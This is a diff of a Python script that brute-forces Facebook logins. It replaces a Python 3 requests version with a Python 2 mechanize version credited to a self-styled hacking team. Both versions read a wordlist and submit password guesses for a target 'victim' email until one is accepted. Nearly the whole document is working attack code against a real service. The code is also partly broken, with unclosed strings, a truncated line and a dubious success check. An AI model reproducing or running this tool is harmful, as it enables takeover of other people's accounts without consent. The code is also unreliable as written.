@@ -1,75 +1,111 @@
-import requests
-import threading
-# import urllib.request
-# import os
-from bs4 import BeautifulSoup
+#!usr/bin/python
+
+
+
 import sys
-try :
-if sys.version_info[ 0 ] < 3 :
-raise "MEMBUTUHKAN/REQUIRED PYTHON 3.x"
-except Exception as ex:
-print ( ''' --------------------------------------
-MEMBUTUHKAN/REQUIRED PYTHON 3.x
-gunakan/use : python3 fb.py
-Send your problems on anon6372098@gmail.com
-#Creator : Anon6372098
-#Email : anon6372098@gmail.com
-#Yt Channel : D4RK SYST3M F41LUR3 S33K3R
-#Github : /Anon6372098
-#Team : D4RK SYST3M F41LUR3 S33K3R (DSFS)
---------------------------------------
-''' )
-sys.exit()
-post_url = 'https://www.facebook.com/login.php'
-headers = {
-'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, lik
-}
-payload = {}
-cookie = {}
-def create_form ():
-form= dict()
-cookie= { 'fr' : '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy' }
-data= requests.get(post_url, headers = headers)
-# print('Form Creating : ',data.url)
-# print('Return Status : ',data.status_code)
-#for i in data.headers:
-# print(i,' : ',data.headers[i])
-for i in data.cookies:
-cookie[i.name] = i.value
-data= BeautifulSoup(data.text, 'html.parser' ).form
-if data.input[ 'name' ] =='lsd' :
-form[ 'lsd' ] = data.input[ 'value' ]
-return (form,cookie)
-def function(email,passw,i):
-global payload,cookie
-if i % 10==1 :
-payload,cookie = create_form()
-payload[ 'email' ] = email
-payload[ 'pass' ] = passw
-# print(payload)
-# print(cookie)
-# print('lsd : ',payload['lsd'])
-# print(cookie)
-r = requests.post(post_url, data= payload, cookies = cookie, headers = headers)
-if 'Find Friends' in r.text:
-print ( 'password is ' ,passw)
-#open('d.html','w').write(r.text)
-return True
-return False
-#payload=create_form()
-print ( '___________________________________________________________________________\n' )
-file= open( 'passwords.txt' , 'r' )
-i = 0
-email = input ( 'Masukkan/Enter Email : ' )
-print ( "" )
-print ( "Target Email ID : " ,email)
-print ( "" )
-while file:
-passw = file.readline().strip()
-i += 1
-print ( "Trying Password " + str (i) + ": " ,passw)
-if function(email,passw,i):
-break
-# threading.Thread(target=function,args=(email,passw,i)).start()
-# if not i%10:
-# os.system('pause')
+import random
+import mechanize
+import cookielib
+
+
+GHT = '''
+                 
+  @copyright Anon6372098@2018
+        
+'''
+
+
+print "--> Creator : Anon6372098"
+print "--> Team : D4RK SYST3M F41LUR3 S33K3R (DSFS)"
+print "--> Yt Channel : D4RK SYST3M F41LUR3 S33K3R"
+print "--> Contact me : anon6372098@gmail.com
+print "--> Github : /Anon6372098
+
+#if(Fullscreen==true)
+#execute=2*x
+
+email = str(raw_input("--> Username : "))
+passwordlist = str(raw_input("--> Name of the password list : "))
+
+useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+
+
+
+login = 'https://www.facebook.com/login.php?login_attempt=1'
+def attack(password):
+
+  try:
+     sys.stdout.write("\r--> trying %s.. " % password)
+     sys.stdout.flush()
+     br.addheaders = [('User-agent', random.choice(useragents))]
+     site = br.open(login)
+     br.select_form(nr=0)
+
+      
+         
+     ##Facebook
+     br.form['email'] =email
+     br.form['pass'] = password
+     br.submit()
+     log = br.geturl()
+     if log == login:
+        print "\n\n\n --> Password found .. !!"
+        print "\n --> Password : %s\n" % (password)
+        sys.exit(1)
+  except KeyboardInterrupt:
+        print "\n[*] Exiting program .. "
+        sys.exit(1)
+
+def search():
+    global password
+    for password in passwords:
+        attack(password.replace("\n",""))
+
+
+
+def check():
+
+    global br
+    global passwords
+    try:
+       br = mechanize.Browser()
+       cj = cookielib.LWPCookieJar()
+       br.set_handle_robots(False)
+       br.set_handle_equiv(True)
+       br.set_handle_referer(True)
+       br.set_handle_redirect(True)
+       br.set_cookiejar(cj)
+       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+    except KeyboardInterrupt:
+       print "\n--> Exiting program ..\n"
+       sys.exit(1)
+    try:
+       list = open(passwordlist, "r")
+       passwords = list.readlines()
+       k = 0
+       while k < len(passwords):
+          passwords[k] = passwords[k].strip()
+          k += 1
+    except IOError:
+        print "\n --> Error: check your password list path \n"
+        sys.exit(1)
+    except KeyboardInterrupt:
+        print "\n --> Exiting program ..\n"
+        sys.exit(1)
+    try:
+        print GHT
+        print " --> Victim  : %s" % (email)
+        print " --> Total no of password in the wordlist:" , len(passwords), "passwords"
+        print " --> Bruteforce started ..."
+    except KeyboardInterrupt:
+        print "\n [*] Exiting program ..\n"
+        sys.exit(1)
+    try:
+        search()
+        attack(password)
+    except KeyboardInterrupt:
+        print "\n --> Exiting program ..\n"
+        sys.exit(1)
+
+if __name__ == '__main__':
+    check()
